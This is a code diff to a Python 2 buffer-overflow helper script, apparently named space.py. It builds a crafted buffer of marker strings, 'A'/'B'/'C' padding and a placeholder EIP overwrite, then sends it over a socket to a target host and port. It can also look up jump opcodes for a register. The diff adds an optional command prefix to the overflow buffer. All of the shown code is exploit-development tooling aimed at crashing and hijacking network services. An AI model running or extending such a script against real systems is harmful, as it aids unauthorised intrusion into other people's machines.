@@ -12,7 +12,7 @@ if len(sys.argv) == 2:
     print jump[register]
     exit(0)
 
-elif len(sys.argv) != 5:
+elif len(sys.argv) < 5:
     print("usage: \"python space.py [target] [port] [size] [eip]\"")
     print("usage: \"can also be used to find jump opcodes with \"python space.py [register name]\"")
     exit(0)
@@ -22,10 +22,15 @@ port = int(sys.argv[2])
 size = int(sys.argv[3])
 eip = int(sys.argv[4])
 
+if len(sys.argv) == 6:
+    cmd = sys.argv[5] + " "
+else:
+    cmd = ""
+
 herring = "This is before the EIP"
 herring2 = "This is after the EIP"
 
-inputBuffer = herring + "A" * (eip - len(herring)) + "B" * 4 + herring2 + "C" * (size - eip - len(herring2))
+inputBuffer = cmd + herring + "A" * (eip - len(herring)) + "B" * 4 + herring2 + "C" * (size - eip - len(herring2) - len(cmd))
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((target,port))
 print("sending buffer")
